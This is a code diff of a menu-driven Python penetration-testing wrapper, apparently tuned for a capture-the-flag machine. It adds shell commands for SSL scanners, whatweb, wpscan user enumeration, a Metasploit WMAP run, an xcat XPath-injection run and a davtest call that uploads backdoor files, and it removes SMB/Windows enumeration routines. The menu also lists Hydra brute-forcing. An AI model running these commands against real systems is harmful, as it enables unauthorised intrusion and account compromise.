@@ -2,14 +2,14 @@
 # coding:UTF-8
 
 # -------------------------------------------------------------------------------------
-#       PYTHON SCRIPT FILE FOR THE FORENSIC ANALYSIS OF REMOTE WINDOWS SYSTEMS
+#         PYTHON SCRIPT FILE FOR THE FORENSIC ANALYSIS OF WEB APPLICATIONS
 #         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
 # -------------------------------------------------------------------------------------
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY                                                                
+# Version : BANK                                                                
 # Details : Load required imports.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -31,7 +31,7 @@ colour3 = 'white'
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : JERRY                                                                
+# Version : BANK                                                                
 # Details : Conduct simple and routine tests on user supplied arguements.   
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -45,7 +45,7 @@ BUG = 0				# BUGHUNT ON/OFF
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : JERRY
+# Version : BANK
 # Details : Create functional calls from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -286,22 +286,22 @@ def display():
    print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')
 
 def options():
-   print('\u2551' + "(0) Re/Set EMPTY      (10) Re/Set EMPTY      (20) NSLookup   (30)               (40)              (50)             (60) GenSSHKey ID (70) MSFTomCat (80) SSH ID 22 " + '\u2551')
-   print('\u2551' + "(1) Re/Set DNSERVER   (11) Re/Set SERVERTIME (21) DNSRecon   (31)               (41)              (51)             (61) GenList USER (71)           (81) Telnet 23 " + '\u2551')
-   print('\u2551' + "(2) Re/Set REMOTE IP  (12) Re/Set DIRECTORY  (22) Dig        (32)               (42)              (52)             (62) GenList PASS (72)           (82) NetCat 80 " + '\u2551')
-   print('\u2551' + "(3) Re/Set LIVE PORTS (13) Ping DNSERVER IP  (23) AdiDNSDump (33)               (43)              (53)             (63) Editor USER  (73)           (83) SQSH  1433" + '\u2551')
-   print('\u2551' + "(4) Re/Set WEBADDRESS (14) Ping REMOTE IP    (24)            (34)               (44)              (54)             (64) Editor PASS  (74)           (84) MSSQL 1433" + '\u2551')
-   print('\u2551' + "(5) Re/Set USERNAME   (15) TraceRoute REM IP (25)            (35)               (45)              (55)             (65) Editor HOST  (75)           (85) MySQL 3306" + '\u2551')
-   print('\u2551' + "(6) Re/Set PASSWORD   (16) Nmap LIVE PORTS   (26)            (36)               (46)              (56)             (66) Editor DNS   (76) Nikto     (86) RDesk 3389" + '\u2551')
-   print('\u2551' + "(7) Re/Set NTLM HASH  (17) Nmap PortService  (27)            (37)               (47)              (57)             (67) HYDRA SSH    (77) GoBuster  (87) XRDP  3389" + '\u2551')
-   print('\u2551' + "(8) Re/Set DNS NAME   (18) Nmap SubDOMAINS   (28)            (38)               (48)              (58)             (68) HYDRA SMB    (78) FTP 21    (88) WinRM 5985" + '\u2551')
-   print('\u2551' + "(9) Re/Set EMPTY      (19) Nmap Server Time  (29)            (39)               (49)              (59)             (69) HYDRA TomCat (79) SSH 22    (89) Save/Exit " + '\u2551')
+   print('\u2551' + "(0) Re/Set EMPTY      (10) Re/Set EMPTY      (20) NSLookup DNS (30) Enum4Linux (40)               (50)             (60) GenSSHKey ID (70) MSFTomCat (80) SSH ID 22 " + '\u2551')
+   print('\u2551' + "(1) Re/Set DNSERVER   (11) Re/Set SERVERTIME (21) DNSRecon DNS (31) XCat  4567 (41)               (51)             (61) GenList USER (71)           (81) Telnet 23 " + '\u2551')
+   print('\u2551' + "(2) Re/Set REMOTE IP  (12) Re/Set DIRECTORY  (22) DigDeep  DNS (32) WPSCan IP  (42)               (52)             (62) GenList PASS (72)           (82) NetCat 80 " + '\u2551')
+   print('\u2551' + "(3) Re/Set LIVE PORTS (13) Ping DNSERVER IP  (23) DNSDump  DNS (33)            (43)               (53)             (63) Editor USER  (73)           (83) SQSH  1433" + '\u2551')
+   print('\u2551' + "(4) Re/Set WEBADDRESS (14) Ping  REMOTE  IP  (24) DavTest  IP  (34)            (44)               (54)             (64) Editor PASS  (74)           (84) MSSQL 1433" + '\u2551')
+   print('\u2551' + "(5) Re/Set USERNAME   (15) Trace REMOTE  IP  (25) SSLyze  443  (35)            (45) Password2HASH (55)             (65) Editor HOST  (75)           (85) MySQL 3306" + '\u2551')
+   print('\u2551' + "(6) Re/Set PASSWORD   (16) Nmap LIVE PORTS   (26) SSLScan 443  (36)            (46)               (56)             (66) Editor DNS   (76) Nikto     (86) RDesk 3389" + '\u2551')
+   print('\u2551' + "(7) Re/Set NTLM HASH  (17) Nmap PortService  (27) TestSSL 443  (37)            (47)               (57)             (67) HYDRA SSH    (77) GoBuster  (87) XRDP  3389" + '\u2551')
+   print('\u2551' + "(8) Re/Set DNS NAME   (18) Nmap SubDOMAINS   (28) What WEB IP  (38)            (48)               (58)             (68) HYDRA SMB    (78) FTP 21    (88) WinRM 5985" + '\u2551')
+   print('\u2551' + "(9) Re/Set EMPTY      (19) Nmap Server Time  (29) MSF WMAP IP  (39)            (49)               (59) GPP Decrypt (69) HYDRA TomCat (79) SSH 22    (89) Save/Exit " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY                                                                
+# Version : BANK                                                                
 # Details : Display my universal header.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -318,7 +318,7 @@ print("BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS). 	     \n")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : JERRY
+# Version : BANK
 # Details : Boot the system and initialise program files and variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -362,7 +362,7 @@ PASS = [" "*COL4]*MAXX	# PASSWORDS
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : JERRY
+# Version : BANK
 # Details : Check the config file for stored variables.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -412,7 +412,7 @@ if len(DIR) < COL1: DIR = padding(DIR, COL1)
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : JERRY
+# Version : BANK
 # Details : Start the main menu controller.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -428,7 +428,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Autofill PORTS, DOMAIN, SID, SHARES, USERS etc.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -567,7 +567,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change remote DNS SERVER name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -596,7 +596,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change remote IP address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -625,7 +625,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change the remote port ranges.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -646,7 +646,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change the web address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -664,7 +664,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change the current USER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -685,7 +685,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change the current USERS PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -703,7 +703,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change the current USERS HASH value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -721,7 +721,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change the remote DOMAIN name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -747,7 +747,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change the remote DOMAIN SID value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -765,7 +765,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change the remote SHARE name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -783,7 +783,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Reset local TIME to match kerberos skew. 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -802,7 +802,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Change local working DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -824,7 +824,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - PING DNS IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -838,7 +838,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - PING REMOTE IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -850,7 +850,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - TRACEROUTE REMOTE IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -862,7 +862,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -891,7 +891,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - Intense quick TCP scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -911,7 +911,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -934,7 +934,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - nmap -sU -O -p 123 --script ntp-info IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -950,7 +950,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - NSLOOKUP ENUMERATION
 # Details : 32/64 bit
 # Modified: N/A
@@ -966,7 +966,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - DNSRECON
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -983,7 +983,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - DIG
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1000,7 +1000,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
 # Details : Menu option selected - DNSDUMP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1033,73 +1033,106 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - 
+# Version : BANK
+# Details : Menu option selected - DAVTEST
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '24':
-      exit(1)
+      if TIP[:5] != "EMPTY":
+         command("davtest -url " + TIP.rstrip(" ") + " -sendbd auto -move -cleanup")
+      else:
+         print("[*] Remote IP address has not been specified...")
+      prompt()   
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - 
+# Version : BANK
+# Details : Menu option selected - SSLYZE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '25':
-      exit(1)
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '26':
-      exit(1)
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '27':
-      exit(1)
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '28':
-      exit(1)
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '29':
-      exit(1)
+      if TIP[:5] != "EMPTY":
+         command("sslyze –regular " + TIP.rstrip(" ") + ":443")
+      else:
+         print("[*] Remote IP address has not been specified...")
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
+# Version : BANK
+# Details : Menu option selected - SSLSCAN
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '26':
+      if TIP[:5] != "EMPTY":
+         command("sslscan –v " + TIP.rstrip(" ") + ":443")
+      else:
+         print("[*] Remote IP address has not been specified...")
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : BANK
+# Details : Menu option selected - TESTSSL
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '27':
+      if TIP[:5] != "EMPTY":
+         command("testssl --full -oA auto " + TIP.rstrip(" ") + ":443")
+      else:
+         print("[*] Remote IP address has not been specified...")
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : BANK
+# Details : Menu option selected - WHATWEB
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '28':
+      if TIP[:5] != "EMPTY":
+         command("whatweb -v -a 3 " + TIP.rstrip(" "))
+      else:
+         print("[*] Remote IP address has not been specified...")
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : BANK
+# Details : Menu option selected - MSF WMAP
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '29':
+      if TIP[:5] != "EMPTY":
+         command("msfdb init")
+         command("service postgresql start")
+         command("touch meterpreter.rc")
+         command("echo 'load wmap' >> meterpreter.rc")
+         command("echo 'wmap_sites -a " + TIP.rstrip(" ") + "' >> meterpreter.rc")
+         command("echo 'wmap_targets -t " + TIP.rstrip(" ") + "' >> meterpreter.rc")
+         command("echo 'wmap_run -e' >> meterpreter.rc")
+         command("msfconsole -r meterpreter.rc")
+         prompt() 
+         os.remove("meterpreter.rc")   
+      else:
+         print("[*] Remote IP address has not been specified...")
+         prompt()      
+         
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : BANK
 # Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP.
 # Details : Anonymous login check.
 # Modified: N/A
@@ -1107,531 +1140,178 @@ while True:
 
    if selection == '30':
       if TIP[:5] != "EMPTY":
-         print ("")
          command("enum4linux -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -v " + TIP.rstrip(" "))
+      else:
+         print("[*] Remote IP address has not been specified...")
       prompt()
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
+# Version : BANK
+# Details : Menu option selected - Xcat 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='31':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         command(PATH + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
+      if TIP[:5] != "EMPTY":
+         command("xcat run " + TIP.rstrip(" ") + ":4567/ query query=Rogue --true-string=Lawyer --fast ")
+      else:
+         print("[*] Remote IP address has not been specified...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
+# Version : BANK
+# Details : Menu option selected - WPSCAN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("[*] Enumerating, please wait....")
-         command(PATH + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > DOMAIN.tmp")         
-         
-         command("cat DOMAIN.tmp | grep 'Domain SID' > SID.tmp")
-         SIDID = linecache.getline("SID.tmp", 1)
-         if SIDID != "":
-            if SID[:5] == "EMPTY":
-               SID = SIDID.replace('[*] Domain SID is: ',"")
-               print("[+] Domain SID found...\n")
-               command("echo " + SID + "\n")
-         if SID[:5] == "EMPTY":
-            print("[-] Unable to find domain SID...")
-         os.remove("SID.tmp")
-         
-         command("sed -i /*/d DOMAIN.tmp")
-         command("sed -i 's/.*://g' DOMAIN.tmp")   
-         command("cat DOMAIN.tmp | grep SidTypeAlias | sort > ALIAS.tmp")      
-         command("cat DOMAIN.tmp | grep SidTypeGroup | sort > GROUP.tmp")
-         command("cat DOMAIN.tmp | grep SidTypeUser  | sort > USERS.tmp")
-         
-         command("sed -i 's/(SidTypeAlias)//g' ALIAS.tmp")
-         command("sed -i 's/(SidTypeGroup)//g' GROUP.tmp")
-         command("sed -i 's/(SidTypeUser)//g'  USERS.tmp")
-         
-         if os.path.getsize("ALIAS.tmp") != 0:
-            print("[+] Found Aliases...\n")
-            command("tput setaf 2; tput bold")
-            command("cat ALIAS.tmp")
-            command("tput sgr0; tput dim")
-         else:
-            print("[-] Unable to find aliases...")
-            
-         if os.path.getsize("GROUP.tmp") != 0:
-            print("\n[+] Found Groups...\n")
-            command("tput setaf 2; tput bold")
-            command("cat GROUP.tmp")
-            command("tput sgr0; tput dim")
-         else:
-            print("[-] Unable to find groups...")
-            
-         if os.path.getsize("USERS.tmp") != 0:
-            print("\n[+] Found Users...\n")
-            command("tput setaf 2; tput bold")
-            command("cat USERS.tmp")  
-            command("tput sgr0; tput dim")
-         else:
-            print("[-] Unable to find usernames...")
-         
-         if os.path.getsize("USERS.tmp") != 0:
-            command("rm usernames.txt")		# DELETE OLD
-            command("touch usernames.txt")	# CREATE NEW
-         
-            for x in range(0, MAXX):
-               username = linecache.getline("USERS.tmp", x + 1)
-               if username != "":
-                  try:
-                     null,USER[x] = username.split(DOM.rstrip(" ") + "\\")
-                  except ValueError:
-                     USER[x] = "Error..."
-                  if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-                  command("echo " + USER[x] + " >> usernames.txt")
-               else:
-                  USER[x] = " "*COL3      
-            command("rm *.tmp")         
+      if TIP[:5] != "EMPTY":
+         command("wpscan --url " + TIP.rstrip(" ") + " -enumerate u")
+      else:
+         print("[*] Remote IP address has not been specified...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='33':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         print("[*] Enumerating users, please wait this can take sometime...\n")
-         os.remove("usernames.txt")					# DELETE CURRENT VERSION
-         command("touch usernames.txt")					# CREATE EMPTY NEW ONE
-         command(PATH + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > USERS.tmp")
-         command("sed -i -n '/Found user: /p' USERS.tmp")		# SELECT ONLY FOUND USERS
-         command("cat USERS.tmp | sort > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
-         os.remove("USERS.tmp")
-         command("mv USERS2.tmp USERS.tmp")      
-
-         for x in range (0, MAXX):
-            USER[x] = linecache.getline('USERS.tmp', x+1)
-            if USER[x] != "":
-               USER[x] = USER[x].replace("Found user: ", "")
-               USER[x] = USER[x].split(",")
-               USER[x] = USER[x][0]
-               USER[x] = padding(USER[x], COL3)
-               if USER[x] != "":
-                  print(colored(USER[x],colour2, attrs=['bold']))
-
-                  command("echo " + USER[x] + " >> usernames.txt")	# ASSIGN USERS NAME
-               else:
-                  USER[x] = " "*COL3					# ASSIGN EMPTY USERS
-               PASS[x] = "."*COL4					# RESET PASSWORDS
-            else:
-               USER[x] = " "*COL3
-               PASS[x] = " "*COL4   
-   
-         os.remove("USERS.tmp")	# CLEAR WORK FILE
-         if USER[1][:1] == " ":
-            print ("[*] No entries received.")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='34':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         command("rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
-# Details : #HKEY_LOCAL_MACHINE\SAM
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='35':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         command(PATH + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='36':
-      CheckParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > SHARES.tmp")
-         
-         command("tput setaf 2; tput bold")
-         command("cat SHARES.tmp")
-         command("tput sgr0; tput dim")
-         
-         command("sed -i /Sharename/d SHARES.tmp")		# TIDY UP THE FILE READY FOR READING
-         command("sed -i /-/d         SHARES.tmp")
-         command("sed -i /SMB1/d      SHARES.tmp")
-         command("sed -i '/^$/d'      SHARES.tmp")
-      
-         count = len(open('SHARES.tmp').readlines( ))                
-         if count > 0:
-            cleanshares()					# PURGE CURRENT SHARE VALUES
-         for x in range(0, count):
-            SHAR[x] = linecache.getline("SHARES.tmp",x + 1)	# RE-POPULATE THE SHARE VALUES
-            SHAR[x] = SHAR[x].lstrip()
-            SHAR[x] = padding(SHAR[x], COL2)
-         
-         os.remove("SHARES.tmp")
-         
-         if SHAR[0]== "session setup failed: NT_STATUS_PASSWORD_MUS":
-            print("[*] Bonus!! It look's like we can change this users password...")
-            command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '37':
-      CheckParams = 0
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-      
-      if CheckParams != 1:
-         if DOM[:5] == "EMPTY":
-            print("")
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
-         else:
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : JERRY
-# Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
+# Version : BANK
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '38':
